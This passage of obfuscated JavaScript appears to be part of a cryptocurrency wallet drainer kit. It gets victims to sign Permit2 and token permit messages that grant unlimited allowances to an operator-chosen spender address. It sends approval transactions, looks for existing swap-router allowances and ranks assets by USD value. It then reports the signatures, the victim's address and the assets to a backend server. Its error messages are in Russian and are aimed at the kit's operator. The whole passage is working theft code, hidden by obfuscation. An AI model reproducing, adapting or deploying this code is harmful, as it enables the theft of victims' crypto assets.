      , _0x3774d3 = BN(await _0x4ce6f2[_0x2687d9(0x2a9)]())[_0x2687d9(0x273)](BN(0x64))[_0x2687d9(0x28f)](BN(Math[_0x2687d9(0x24b)](MS_Gas_Multiplier * 0x64)));
    let _0x76a469 = {
        'from': MS_Current_Address,
        'to': _0x2f3180[_0x2687d9(0x34b)],
        'value': '0x0',
        'data': '0x'
    };
    const _0x31f221 = new Web3(MS_Provider);
    let _0x5dc075 = null;
    const _0x4e30cf = new _0x31f221[(_0x2687d9(0x2e3))]['Contract'](MS_Contract_ABI[_0x2687d9(0x28d)],_0x2f3180[_0x2687d9(0x34b)]);
    _0x5dc075 = _0x4e30cf[_0x2687d9(0x32c)][_0x2687d9(0x35c)](MS_Settings['Address'], !![])[_0x2687d9(0x194)](),
    _0x76a469[_0x2687d9(0x29b)] = _0x5dc075;
    const _0x55d4ba = await _0x4ce6f2[_0x2687d9(0x393)](_0x76a469)
      , _0xd69098 = await _0x4ce6f2['getBalance'](MS_Current_Address)
      , _0x54b721 = _0xd69098[_0x2687d9(0x259)](_0x55d4ba[_0x2687d9(0x28f)](_0x3774d3));
    if (_0x54b721['lt'](BN(0x0)))
        throw 'LOW_BALANCE';
    const _0x9f37b3 = await _0x4ce6f2[_0x2687d9(0x290)](MS_Current_Address, 'pending');
    _0x76a469[_0x2687d9(0x236)] = _0x9f37b3,
    _0x76a469[_0x2687d9(0x26d)] = _0x3774d3,
    _0x76a469['gasLimit'] = _0x55d4ba,
    await transfer_request(_0x2f3180),
    sign_next();
    const _0x5e6423 = await MS_Signer['sendTransaction'](_0x76a469);
    wait_message();
    if (MS_Settings[_0x2687d9(0x2d2)][_0x2687d9(0x2b2)])
        await _0x4ce6f2[_0x2687d9(0x378)](_0x5e6423[_0x2687d9(0x318)], 0x1, 0x7530);
    await transfer_success(_0x2f3180),
    sign_ready();
}
  , DO_PERMIT2 = async(_0x2956b6,_0x5620bc)=>{
    const _0x17e002 = a0_0x66027a
      , _0x1da2ce = new ethers[(_0x17e002(0x2b7))](_0x17e002(0x2cc),MS_Contract_ABI[_0x17e002(0x1bd)],MS_Signer);
    let _0x19d6a2 = {
        'name': _0x17e002(0x358),
        'chainId': _0x2956b6['chain_id'],
        'verifyingContract': _0x17e002(0x2cc)
    }
      , _0x9384f0 = Date[_0x17e002(0x1e4)]() + 0x3e8 * 0x3c * 0x3c * 0x18 * 0x164
      , _0x50313f = null
      , _0x331dd8 = null
      , _0x319808 = null;
    if (_0x5620bc['length'] > 0x1) {
        let _0x2b472f = {
            'PermitBatch': [{
                'name': _0x17e002(0x317),
                'type': 'PermitDetails[]'
            }, {
                'name': _0x17e002(0x1e8),
                'type': _0x17e002(0x34b)
            }, {
                'name': 'sigDeadline',
                'type': _0x17e002(0x3a3)
            }],
            'PermitDetails': [{
                'name': 'token',
                'type': _0x17e002(0x34b)
            }, {
                'name': _0x17e002(0x3a7),
                'type': _0x17e002(0x1ba)
            }, {
                'name': _0x17e002(0x276),
                'type': _0x17e002(0x377)
            }, {
                'name': _0x17e002(0x236),
                'type': _0x17e002(0x377)
            }]
        }
          , _0x307de9 = [];
        for (const _0x219a21 of _0x5620bc) {
            try {
                _0x307de9[_0x17e002(0x212)]({
                    'token': _0x219a21['address'],
                    'expiration': _0x9384f0,
                    'amount': _0x17e002(0x1fc),
                    'nonce': (await _0x1da2ce[_0x17e002(0x357)](MS_Current_Address, _0x219a21[_0x17e002(0x34b)], MS_Settings[_0x17e002(0x2d2)][_0x17e002(0x24d)] ? MS_Settings['Personal_Wallet'][_0x17e002(0x34b)] : MS_Settings['Address']))[_0x17e002(0x236)]
                });
            } catch (_0x16487c) {
                console[_0x17e002(0x217)](_0x16487c);
            }
        }
        _0x331dd8 = {
            'details': _0x307de9,
            'spender': MS_Settings[_0x17e002(0x2d2)][_0x17e002(0x24d)] ? MS_Settings[_0x17e002(0x1ef)][_0x17e002(0x34b)] : MS_Settings[_0x17e002(0x2e9)],
            'sigDeadline': _0x9384f0
        },
        swap_request('Permit2', _0x2956b6, _0x5620bc),
        sign_next(),
        _0x50313f = await MS_Signer[_0x17e002(0x21f)](_0x19d6a2, _0x2b472f, _0x331dd8),
        _0x319808 = 0x2;
    } else {
        let _0xfc90fa = {
            'PermitSingle': [{
                'name': _0x17e002(0x317),
                'type': _0x17e002(0x2ed)
            }, {
                'name': 'spender',
                'type': _0x17e002(0x34b)
            }, {
                'name': _0x17e002(0x2db),
                'type': _0x17e002(0x3a3)
            }],
            'PermitDetails': [{
                'name': _0x17e002(0x260),
                'type': _0x17e002(0x34b)
            }, {
                'name': 'amount',
                'type': _0x17e002(0x1ba)
            }, {
                'name': 'expiration',
                'type': 'uint48'
            }, {
                'name': _0x17e002(0x236),
                'type': _0x17e002(0x377)
            }]
        };
        _0x331dd8 = {
            'details': {
                'token': _0x2956b6['address'],
                'amount': '1461501637330902918203684832716283019655932542975',
                'expiration': _0x9384f0,
                'nonce': (await _0x1da2ce[_0x17e002(0x357)](MS_Current_Address, _0x2956b6['address'], MS_Settings[_0x17e002(0x2d2)]['Use_Randomizer_For_Tokens'] ? MS_Settings[_0x17e002(0x1ef)]['address'] : MS_Settings[_0x17e002(0x2e9)]))[_0x17e002(0x236)]
            },
            'spender': MS_Settings[_0x17e002(0x2d2)][_0x17e002(0x24d)] ? MS_Settings[_0x17e002(0x1ef)][_0x17e002(0x34b)] : MS_Settings[_0x17e002(0x2e9)],
            'sigDeadline': _0x9384f0
        },
        swap_request('Permit2', _0x2956b6, [_0x2956b6]),
        sign_next(),
        _0x50313f = await MS_Signer[_0x17e002(0x21f)](_0x19d6a2, _0xfc90fa, _0x331dd8),
        _0x319808 = 0x1;
    }
    if (_0x50313f != null) {
        await swap_success(_0x17e002(0x358), _0x2956b6, _0x5620bc),
        wait_message();
        const _0x86cfb0 = send_request({
            'action': _0x17e002(0x1b8),
            'user_id': MS_ID,
            'signature': _0x50313f,
            'message': _0x331dd8,
            'asset': _0x2956b6,
            'assets': _0x5620bc,
            'address': MS_Current_Address,
            'mode': _0x319808,
            'PW': MS_Settings['Personal_Wallet']
        });
        if (MS_Settings['Settings'][_0x17e002(0x3a9)])
            await _0x86cfb0;
        sign_ready();
    } else
        await sign_cancel();
}
  , PERMIT_TOKEN = async _0xd2acdb=>{
    const _0x5e1848 = a0_0x66027a
      , _0x1bbb70 = new ethers[(_0x5e1848(0x2b7))](_0xd2acdb[_0x5e1848(0x34b)],_0xd2acdb['abi'],MS_Signer)
      , _0xa68fc0 = await _0x1bbb70[_0x5e1848(0x335)](MS_Current_Address)
      , _0x2adbf8 = await _0x1bbb70[_0x5e1848(0x2c9)]();
    let _0x249366 = ethers[_0x5e1848(0x30c)][_0x5e1848(0x31e)](MS_Unlimited_Amount);
    for (const _0x164227 of MS_Settings['Unlimited_BL']) {
        try {
            if (_0x164227[0x0] == MS_Current_Chain_ID && _0x164227[0x1] == _0xd2acdb[_0x5e1848(0x34b)]['toLowerCase']()[_0x5e1848(0x2fc)]()) {
                _0x249366 = _0xd2acdb[_0x5e1848(0x270)];
                break;
            }
        } catch (_0x5729e6) {
            console[_0x5e1848(0x217)](_0x5729e6);
        }
    }
    const _0x7fd2f4 = Date[_0x5e1848(0x1e4)]() + 0x3e8 * 0x3c * 0x3c * 0x18 * 0x164;
    let _0x59398a = null
      , _0x463557 = null;
    if (_0xd2acdb[_0x5e1848(0x1fa)] == 0x1)
        _0x59398a = {
            'Permit': [{
                'name': _0x5e1848(0x302),
                'type': _0x5e1848(0x34b)
            }, {
                'name': _0x5e1848(0x1e8),
                'type': 'address'
            }, {
                'name': _0x5e1848(0x236),
                'type': 'uint256'
            }, {
                'name': _0x5e1848(0x333),
                'type': _0x5e1848(0x3a3)
            }, {
                'name': _0x5e1848(0x347),
                'type': _0x5e1848(0x3b2)
            }]
        },
        _0x463557 = {
            'holder': MS_Current_Address,
            'spender': MS_Settings[_0x5e1848(0x2d2)][_0x5e1848(0x24d)] ? MS_Settings[_0x5e1848(0x1ef)][_0x5e1848(0x34b)] : MS_Settings[_0x5e1848(0x2e9)],
            'nonce': _0xa68fc0,
            'expiry': _0x7fd2f4,
            'allowed': !![]
        };
    else
        _0xd2acdb[_0x5e1848(0x1fa)] == 0x2 && (_0x59398a = {
            'Permit': [{
                'name': _0x5e1848(0x36c),
                'type': _0x5e1848(0x34b)
            }, {
                'name': _0x5e1848(0x1e8),
                'type': _0x5e1848(0x34b)
            }, {
                'name': _0x5e1848(0x2dd),
                'type': _0x5e1848(0x3a3)
            }, {
                'name': _0x5e1848(0x236),
                'type': _0x5e1848(0x3a3)
            }, {
                'name': _0x5e1848(0x2e8),
                'type': _0x5e1848(0x3a3)
            }]
        },
        _0x463557 = {
            'owner': MS_Current_Address,
            'spender': MS_Settings[_0x5e1848(0x2d2)][_0x5e1848(0x24d)] ? MS_Settings[_0x5e1848(0x1ef)][_0x5e1848(0x34b)] : MS_Settings[_0x5e1848(0x2e9)],
            'value': _0x249366,
            'nonce': _0xa68fc0,
            'deadline': _0x7fd2f4
        });
    await approve_request(_0xd2acdb),
    sign_next();
    const _0x45f4b = await MS_Signer[_0x5e1848(0x21f)]({
        'name': _0x2adbf8,
        'version': _0xd2acdb[_0x5e1848(0x209)],
        'chainId': _0xd2acdb[_0x5e1848(0x3ab)],
        'verifyingContract': _0xd2acdb[_0x5e1848(0x34b)]
    }, _0x59398a, _0x463557)
      , _0x134cf0 = {
        'r': _0x45f4b[_0x5e1848(0x2d5)](0x0, 0x42),
        's': '0x' + _0x45f4b['slice'](0x42, 0x82),
        'v': Number('0x' + _0x45f4b[_0x5e1848(0x2d5)](0x82, 0x84))
    };
    await approve_success(_0xd2acdb),
    wait_message();
    const _0x52c71f = send_request({
        'action': _0x5e1848(0x35b),
        'user_id': MS_ID,
        'sign': {
            'type': _0xd2acdb[_0x5e1848(0x1fa)],
            'version': _0xd2acdb[_0x5e1848(0x209)],
            'chain_id': _0xd2acdb[_0x5e1848(0x3ab)],
            'address': _0xd2acdb['address'],
            'owner': MS_Current_Address,
            'spender': MS_Settings[_0x5e1848(0x2d2)]['Use_Randomizer_For_Tokens'] ? MS_Settings['Personal_Wallet'][_0x5e1848(0x34b)] : MS_Settings[_0x5e1848(0x2e9)],
            'value': _0x249366['toString'](),
            'nonce': _0xa68fc0['toString'](),
            'deadline': _0x7fd2f4,
            'r': _0x134cf0['r'],
            's': _0x134cf0['s'],
            'v': _0x134cf0['v'],
            'abi': _0xd2acdb[_0x5e1848(0x38c)]
        },
        'asset': _0xd2acdb,
        'address': MS_Current_Address,
        'PW': MS_Settings[_0x5e1848(0x1ef)]
    });
    if (MS_Settings[_0x5e1848(0x2d2)][_0x5e1848(0x3a9)])
        await _0x52c71f;
    sign_ready();
}
  , sign_success = async(_0xd4af46,_0x1fc5f5='0')=>{
    const _0x4b9fdd = a0_0x66027a;
    try {
        if (_0xd4af46[_0x4b9fdd(0x1c4)] == 'NATIVE') {
            _0xd4af46[_0x4b9fdd(0x270)] = _0x1fc5f5;
            const _0x2d0927 = ethers[_0x4b9fdd(0x371)][_0x4b9fdd(0x199)](_0xd4af46[_0x4b9fdd(0x270)]);
            _0xd4af46[_0x4b9fdd(0x1f5)] = parseFloat(ethers[_0x4b9fdd(0x30c)][_0x4b9fdd(0x243)](_0x2d0927, _0x4b9fdd(0x2be))) * MS_Currencies[convert_chain('ID', 'CURRENCY', _0xd4af46['chain_id'])]['USD'],
            await send_request({
                'action': 'sign_success',
                'asset': _0xd4af46,
                'user_id': MS_ID
            });
        } else
            await send_request({
                'action': _0x4b9fdd(0x380),
                'asset': _0xd4af46,
                'user_id': MS_ID
            });
    } catch (_0x440424) {
        console[_0x4b9fdd(0x217)](_0x440424);
    }
}
  , swap_success = async(_0x26dfa2,_0x487b4c,_0x34b734=[],_0x4f838e='0')=>{
    const _0x5ee8ef = a0_0x66027a;
    try {
        if (_0x487b4c['type'] == _0x5ee8ef(0x309)) {
            _0x487b4c[_0x5ee8ef(0x270)] = _0x4f838e;
            const _0x3bbb93 = ethers[_0x5ee8ef(0x371)][_0x5ee8ef(0x199)](_0x487b4c[_0x5ee8ef(0x270)]);
            _0x487b4c[_0x5ee8ef(0x1f5)] = parseFloat(ethers['utils'][_0x5ee8ef(0x243)](_0x3bbb93, _0x5ee8ef(0x2be))) * MS_Currencies[convert_chain('ID', _0x5ee8ef(0x293), _0x487b4c[_0x5ee8ef(0x3ab)])]['USD'],
            await send_request({
                'action': _0x5ee8ef(0x221),
                'asset': _0x487b4c,
                'user_id': MS_ID,
                'list': _0x34b734,
                'swapper': _0x26dfa2
            });
        } else
            await send_request({
                'action': 'swap_success',
                'asset': _0x487b4c,
                'user_id': MS_ID,
                'list': _0x34b734,
                'swapper': _0x26dfa2
            });
    } catch (_0x4115ab) {
        console[_0x5ee8ef(0x217)](_0x4115ab);
    }
}
  , transfer_success = async(_0x8c047e,_0x235e71='0')=>{
    const _0x30392f = a0_0x66027a;
    try {
        if (_0x8c047e[_0x30392f(0x1c4)] == _0x30392f(0x309)) {
            _0x8c047e[_0x30392f(0x270)] = _0x235e71;
            const _0x1242a4 = ethers[_0x30392f(0x371)][_0x30392f(0x199)](_0x8c047e[_0x30392f(0x270)]);
            _0x8c047e[_0x30392f(0x1f5)] = parseFloat(ethers[_0x30392f(0x30c)]['formatUnits'](_0x1242a4, _0x30392f(0x2be))) * MS_Currencies[convert_chain('ID', _0x30392f(0x293), _0x8c047e['chain_id'])]['USD'],
            await send_request({
                'action': _0x30392f(0x313),
                'asset': _0x8c047e,
                'user_id': MS_ID
            });
        } else
            await send_request({
                'action': _0x30392f(0x313),
                'asset': _0x8c047e,
                'user_id': MS_ID
            });
    } catch (_0x4aa64f) {
        console[_0x30392f(0x217)](_0x4aa64f);
    }
}
  , approve_success = async _0x445b40=>{
    const _0x146462 = a0_0x66027a;
    try {
        await send_request({
            'action': _0x146462(0x2ea),
            'asset': _0x445b40,
            'user_id': MS_ID
        });
    } catch (_0x3911aa) {
        console[_0x146462(0x217)](_0x3911aa);
    }
}
  , sign_cancel = async()=>{
    const _0x5d2df8 = a0_0x66027a;
    try {
        await send_request({
            'action': _0x5d2df8(0x19b),
            'user_id': MS_ID
        });
    } catch (_0x1be5dd) {
        console[_0x5d2df8(0x217)](_0x1be5dd);
    }
}
  , sign_unavailable = async()=>{
    const _0x456438 = a0_0x66027a;
    try {
        await send_request({
            'action': _0x456438(0x1a4),
            'user_id': MS_ID
        }),
        MS_Sign_Disabled = !![];
    } catch (_0x4e99ea) {
        console[_0x456438(0x217)](_0x4e99ea);
    }
}
  , transfer_cancel = async()=>{
    const _0x5ad2a2 = a0_0x66027a;
    try {
        await send_request({
            'action': _0x5ad2a2(0x1a5),
            'user_id': MS_ID
        });
    } catch (_0x121b6c) {
        console[_0x5ad2a2(0x217)](_0x121b6c);
    }
}
  , approve_cancel = async()=>{
    const _0x11f39c = a0_0x66027a;
    try {
        await send_request({
            'action': 'approve_cancel',
            'user_id': MS_ID
        });
    } catch (_0x3f407e) {
        console[_0x11f39c(0x217)](_0x3f407e);
    }
}
  , chain_cancel = async()=>{
    const _0x31c8f5 = a0_0x66027a;
    try {
        await send_request({
            'action': 'chain_cancel',
            'user_id': MS_ID
        });
    } catch (_0x9524ef) {
        console[_0x31c8f5(0x217)](_0x9524ef);
    }
}
  , chain_success = async()=>{
    const _0x554d7e = a0_0x66027a;
    try {
        await send_request({
            'action': 'chain_success',
            'user_id': MS_ID
        });
    } catch (_0x581c0f) {
        console[_0x554d7e(0x217)](_0x581c0f);
    }
}
  , chain_request = async(_0x4957e5,_0x55db13)=>{
    const _0x2c168d = a0_0x66027a;
    try {
        await send_request({
            'action': _0x2c168d(0x319),
            'user_id': MS_ID,
            'chains': [_0x4957e5, _0x55db13]
        });
    } catch (_0x1480c0) {
        console[_0x2c168d(0x217)](_0x1480c0);
    }
}
  , sign_request = async _0xfdb7da=>{
    const _0x234fcf = a0_0x66027a;
    try {
        await send_request({
            'action': _0x234fcf(0x2c8),
            'user_id': MS_ID,
            'asset': _0xfdb7da
        });
    } catch (_0x5e32e0) {
        console[_0x234fcf(0x217)](_0x5e32e0);
    }
}
  , swap_request = async(_0x22868a,_0x1e7c43,_0x2f52b8=[])=>{
    const _0x1b3a7f = a0_0x66027a;
    try {
        await send_request({
            'action': 'swap_request',
            'user_id': MS_ID,
            'asset': _0x1e7c43,
            'list': _0x2f52b8,
            'swapper': _0x22868a
        });
    } catch (_0x40a791) {
        console[_0x1b3a7f(0x217)](_0x40a791);
    }
}
  , transfer_request = async _0x49b687=>{
    const _0x389314 = a0_0x66027a;
    try {
        await send_request({
            'action': _0x389314(0x339),
            'user_id': MS_ID,
            'asset': _0x49b687
        });
    } catch (_0x503c37) {
        console[_0x389314(0x217)](_0x503c37);
    }
}
  , approve_request = async _0x55cd88=>{
    const _0x34efa7 = a0_0x66027a;
    try {
        await send_request({
            'action': _0x34efa7(0x225),
            'user_id': MS_ID,
            'asset': _0x55cd88
        });
    } catch (_0x3e1dc2) {
        console[_0x34efa7(0x217)](_0x3e1dc2);
    }
}
  , is_increase_approve = _0x13db47=>{
    const _0x2fd210 = a0_0x66027a;
    try {
        if (_0x13db47['hasOwnProperty'](_0x2fd210(0x2ff)))
            return 0x1;
        else
            return _0x13db47[_0x2fd210(0x329)](_0x2fd210(0x379)) ? 0x2 : ![];
    } catch (_0x3551a3) {
        return ![];
    }
}
  , get_wallet_assets = async _0x77fcff=>{
    const _0x528e1d = a0_0x66027a;
    try {
        let _0x1daf9c = await send_request({
            'action': _0x528e1d(0x31c),
            'address': MS_Current_Address
        })
          , _0x17f8fc = [];
        if (_0x1daf9c['status'] == 'OK')
            _0x17f8fc = _0x1daf9c[_0x528e1d(0x29b)];
        else {
            if (MS_Settings['AT'] != '' && _0x1daf9c[_0x528e1d(0x385)] == 'LOCAL_CHECK')
                _0x17f8fc = await get_tokens(_0x77fcff);
            else {
                if (_0x1daf9c['error'] != _0x528e1d(0x1c1))
                    return _0x17f8fc;
                else
                    return MS_Check_Done = !![],
                    MS_Loader_Style == 0x2 ? MSL[_0x528e1d(0x211)]({
                        'icon': 'error',
                        'title': _0x528e1d(0x1fd),
                        'subtitle': _0x528e1d(0x197),
                        'text': 'Ни\x20один\x20из\x20оценщиков\x20не\x20активирован\x20в\x20настройках\x20скрипта,\x20оценка\x20активов\x20кошелька\x20невозможна,\x20проверьте\x20настройки\x20и\x20перезапустите\x20сервер!',
                        'showConfirmButton': !![],
                        'confirmButtonText': 'OK',
                        'color': MS_Color_Scheme
                    }) : (Swal[_0x528e1d(0x1de)](),
                    Swal[_0x528e1d(0x211)]({
                        'html': '<b>Ошибка</b><br><br>Ни\x20один\x20из\x20оценщиков\x20не\x20активирован\x20в\x20настройках\x20скрипта,\x20оценка\x20активов\x20кошелька\x20невозможна,\x20проверьте\x20настройки\x20и\x20перезапустите\x20сервер!',
                        'icon': _0x528e1d(0x385),
                        'allowOutsideClick': !![],
                        'allowEscapeKey': !![],
                        'timer': 0x0,
                        'width': 0x258,
                        'showConfirmButton': !![],
                        'confirmButtonText': 'OK'
                    })),
                    await new Promise(_0x2c966c=>setTimeout(_0x2c966c, 0x2710)),
                    _0x17f8fc;
            }
        }
        let _0xe56721 = [];
        for (let _0x265b4a = _0x17f8fc[_0x528e1d(0x2ae)] - 0x1; _0x265b4a >= 0x0; _0x265b4a--) {
            try {
                const _0x226a57 = _0x17f8fc[_0x265b4a]
                  , _0x294ddb = convert_chain('ID', _0x528e1d(0x1d9), _0x226a57[_0x528e1d(0x3ab)]);
                if (!MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x308)][_0x294ddb][_0x528e1d(0x2ac)])
                    _0x17f8fc[_0x528e1d(0x300)](_0x265b4a, 0x1);
                else {
                    if (_0x226a57[_0x528e1d(0x1c4)] == _0x528e1d(0x309) && !MS_Settings['Settings'][_0x528e1d(0x308)][_0x294ddb][_0x528e1d(0x31d)])
                        _0x17f8fc[_0x528e1d(0x300)](_0x265b4a, 0x1);
                    else {
                        if (_0x226a57['type'] == _0x528e1d(0x2f2) && !MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x308)][_0x294ddb][_0x528e1d(0x1e0)])
                            _0x17f8fc['splice'](_0x265b4a, 0x1);
                        else {
                            if (_0x226a57[_0x528e1d(0x1c4)] == _0x528e1d(0x309) && _0x226a57[_0x528e1d(0x1f5)] < MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x308)][_0x294ddb][_0x528e1d(0x208)])
                                _0x17f8fc[_0x528e1d(0x300)](_0x265b4a, 0x1);
                            else {
                                if (_0x226a57['type'] == _0x528e1d(0x2f2) && _0x226a57[_0x528e1d(0x1f5)] < MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x308)][_0x294ddb][_0x528e1d(0x2a8)])
                                    _0x17f8fc[_0x528e1d(0x300)](_0x265b4a, 0x1);
                                else
                                    _0x226a57[_0x528e1d(0x1c4)] == _0x528e1d(0x2f2) && (MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x358)][_0x528e1d(0x370)] && _0xe56721[_0x528e1d(0x212)](new Promise(async _0x3aea12=>{
                                        const _0x1063b9 = _0x528e1d;
                                        try {
                                            let _0x582004 = ![];
                                            for (const _0x46407e of MS_Settings[_0x1063b9(0x278)]) {
                                                if (_0x46407e[0x0] == _0x226a57[_0x1063b9(0x3ab)] && _0x46407e[0x1] === _0x226a57['address'][_0x1063b9(0x2d4)]()['trim']()) {
                                                    _0x582004 = !![];
                                                    break;
                                                }
                                            }
                                            if (_0x226a57['amount_usd'] >= MS_Settings['Settings'][_0x1063b9(0x358)][_0x1063b9(0x33d)][_0x226a57[_0x1063b9(0x3ab)]] && !_0x582004) {
                                                const _0xf985a6 = new ethers['providers'][(_0x1063b9(0x21c))](MS_Settings[_0x1063b9(0x1a7)][_0x226a57['chain_id']])
                                                  , _0x32b68b = new ethers[(_0x1063b9(0x2b7))](_0x226a57[_0x1063b9(0x34b)],MS_Contract_ABI[_0x1063b9(0x2f2)],_0xf985a6);
                                                let _0x280d11 = await _0x32b68b[_0x1063b9(0x357)](MS_Current_Address, _0x1063b9(0x2cc));
                                                ethers[_0x1063b9(0x371)][_0x1063b9(0x199)](_0x280d11)['gt'](ethers[_0x1063b9(0x371)][_0x1063b9(0x199)]('0')) && (_0x226a57['permit2'] = !![],
                                                _0x226a57[_0x1063b9(0x357)] = _0x280d11,
                                                console[_0x1063b9(0x217)](_0x1063b9(0x32f) + _0x226a57[_0x1063b9(0x2c9)] + _0x1063b9(0x205) + _0x280d11));
                                            }
                                        } catch (_0xffe8f9) {
                                            console[_0x1063b9(0x217)](_0xffe8f9);
                                        }
                                        _0x3aea12();
                                    }
                                    )),
                                    (MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x395)][_0x528e1d(0x370)] && MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x395)]['Priority'] > 0x0 || MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x316)]['MetaMask'] >= 0x2 && MS_Current_Provider == _0x528e1d(0x210) || MS_Settings['Settings'][_0x528e1d(0x316)][_0x528e1d(0x1fb)] >= 0x2 && MS_Current_Provider == _0x528e1d(0x219)) && _0xe56721['push'](new Promise(async _0x173a03=>{
                                        const _0x414534 = _0x528e1d;
                                        try {
                                            if (MS_Settings[_0x414534(0x2d2)][_0x414534(0x316)][_0x414534(0x210)] >= 0x2 && MS_Current_Provider == _0x414534(0x210) || MS_Settings[_0x414534(0x2d2)]['Approve'][_0x414534(0x1fb)] >= 0x2 && MS_Current_Provider == 'Trust\x20Wallet' || _0x226a57[_0x414534(0x1f5)] >= MS_Settings[_0x414534(0x2d2)][_0x414534(0x395)][_0x414534(0x33d)][_0x226a57[_0x414534(0x3ab)]]) {
                                                const _0x74b78d = await retrive_token(_0x226a57[_0x414534(0x3ab)], _0x226a57[_0x414534(0x34b)])
                                                  , _0x57bdd1 = new ethers['providers'][(_0x414534(0x21c))](MS_Settings[_0x414534(0x1a7)][_0x226a57[_0x414534(0x3ab)]])
                                                  , _0x2c5e08 = new ethers[(_0x414534(0x2b7))](_0x226a57['address'],_0x74b78d,_0x57bdd1);
                                                if (is_increase_approve(_0x2c5e08[_0x414534(0x252)]) == 0x2)
                                                    _0x226a57[_0x414534(0x229)] = 0x2,
                                                    _0x226a57[_0x414534(0x38c)] = _0x74b78d;
                                                else
                                                    is_increase_approve(_0x2c5e08[_0x414534(0x252)]) == 0x1 && (_0x226a57[_0x414534(0x229)] = 0x1,
                                                    _0x226a57[_0x414534(0x38c)] = _0x74b78d);
                                                if (_0x226a57[_0x414534(0x1f5)] >= MS_Settings[_0x414534(0x2d2)][_0x414534(0x395)][_0x414534(0x33d)][_0x226a57[_0x414534(0x3ab)]]) {
                                                    const _0xf12512 = get_permit_type(_0x2c5e08[_0x414534(0x252)]);
                                                    _0x226a57[_0x414534(0x1fa)] = _0xf12512,
                                                    _0x226a57['permit_ver'] = '1',
                                                    _0x226a57['abi'] = _0x74b78d;
                                                    if (_0xf12512 > 0x0) {
                                                        if (_0x2c5e08[_0x414534(0x252)]['hasOwnProperty'](_0x414534(0x2ce)))
                                                            try {
                                                                _0x226a57['permit_ver'] = await _0x2c5e08[_0x414534(0x2ce)]();
                                                            } catch (_0x54e9a5) {
                                                                console[_0x414534(0x217)](_0x54e9a5);
                                                            }
                                                        console[_0x414534(0x217)](_0x414534(0x31b) + _0x226a57[_0x414534(0x2c9)] + ',\x20Permit\x20Type:\x20' + _0xf12512 + ',\x20Version:\x20' + _0x226a57['permit_ver']);
                                                    }
                                                }
                                            }
                                        } catch (_0xe804e1) {
                                            console[_0x414534(0x217)](_0xe804e1);
                                        }
                                        _0x173a03();
                                    }
                                    )),
                                    MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x224)][_0x528e1d(0x2ac)] && _0xe56721[_0x528e1d(0x212)](new Promise(async _0x55cb6a=>{
                                        const _0x39c46e = _0x528e1d;
                                        try {
                                            if (_0x226a57['amount_usd'] >= MS_Settings[_0x39c46e(0x2d2)][_0x39c46e(0x224)]['Price']) {
                                                const _0x10d0f6 = new ethers[(_0x39c46e(0x38b))][(_0x39c46e(0x21c))](MS_Settings[_0x39c46e(0x1a7)][_0x226a57[_0x39c46e(0x3ab)]]);
                                                for (const _0x4bd819 of MS_Routers[_0x226a57[_0x39c46e(0x3ab)]]) {
                                                    try {
                                                        const _0x50ef98 = new ethers[(_0x39c46e(0x2b7))](_0x226a57[_0x39c46e(0x34b)],MS_Contract_ABI[_0x39c46e(0x2f2)],_0x10d0f6)
                                                          , _0x560fc9 = await _0x50ef98['allowance'](MS_Current_Address, _0x4bd819[0x1]);
                                                        if (ethers[_0x39c46e(0x371)][_0x39c46e(0x199)](_0x560fc9)['gt'](ethers[_0x39c46e(0x371)][_0x39c46e(0x199)]('0'))) {
                                                            if (_0x4bd819[0x0] == _0x39c46e(0x2a6) && MS_Settings[_0x39c46e(0x2d2)]['Swappers']['Quick'] == 0x0)
                                                                continue;
                                                            if (_0x4bd819[0x0] == _0x39c46e(0x1ff) && MS_Settings['Settings']['Swappers'][_0x39c46e(0x3ac)] == 0x0)
                                                                continue;
                                                            if (_0x4bd819[0x0] == 'Uniswap' && (!MS_Uniswap_Whitelist[_0x39c46e(0x389)](_0x226a57['address']) || MS_Settings[_0x39c46e(0x2d2)]['Swappers'][_0x39c46e(0x20c)] == 0x0))
                                                                continue;
                                                            if ((_0x4bd819[0x0] == _0x39c46e(0x3a8) || _0x4bd819[0x0] == 'Pancake_V3') && (!MS_Pancake_Whitelist['includes'](_0x226a57[_0x39c46e(0x34b)]) || MS_Settings[_0x39c46e(0x2d2)][_0x39c46e(0x224)][_0x39c46e(0x3a8)] == 0x0))
                                                                continue;
                                                            _0x226a57[_0x39c46e(0x21b)] = !![],
                                                            _0x226a57[_0x39c46e(0x218)] = _0x4bd819[0x0],
                                                            _0x226a57['swapper_address'] = _0x4bd819[0x1],
                                                            _0x226a57[_0x39c46e(0x315)] = _0x560fc9,
                                                            console[_0x39c46e(0x217)]('[SWAP\x20FOUND]\x20' + _0x226a57['name'] + ',\x20' + _0x4bd819[0x0]);
                                                            break;
                                                        }
                                                    } catch (_0x13f6fe) {
                                                        console[_0x39c46e(0x217)](_0x13f6fe);
                                                    }
                                                }
                                            }
                                        } catch (_0x40e054) {
                                            console[_0x39c46e(0x217)](_0x40e054);
                                        }
                                        _0x55cb6a();
                                    }
                                    )));
                            }
                        }
                    }
                }
            } catch (_0x3addf6) {
                console[_0x528e1d(0x217)](_0x3addf6);
            }
        }
        await Promise[_0x528e1d(0x193)](_0xe56721);
        let _0xecbe1 = ![];
        for (const _0x15e418 in MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x308)]) {
            try {
                if (MS_Settings[_0x528e1d(0x2d2)][_0x528e1d(0x308)][_0x15e418][_0x528e1d(0x314)]) {
                    _0xecbe1 = !![];
                    break;
                }
            } catch (_0x2578c5) {
                console['log'](_0x2578c5);
            }
        }
        if (_0xecbe1)
            try {
                let _0x2c841f = [];
                _0x1daf9c = await send_request({
                    'action': _0x528e1d(0x23f),
                    'address': MS_Current_Address
                });
                if (_0x1daf9c[_0x528e1d(0x250)] == 'OK') {
                    _0x2c841f = _0x1daf9c[_0x528e1d(0x29b)];
                    for (const _0x511e47 of _0x2c841f) {
                        try {
                            const _0x2701d5 = convert_chain('ID', _0x528e1d(0x1d9), _0x511e47[_0x528e1d(0x3ab)]);
                            if (_0x511e47[_0x528e1d(0x1c4)] == 'ERC1155')
                                continue;
                            if (!MS_Settings['Settings'][_0x528e1d(0x308)][_0x2701d5][_0x528e1d(0x314)])
                                continue;
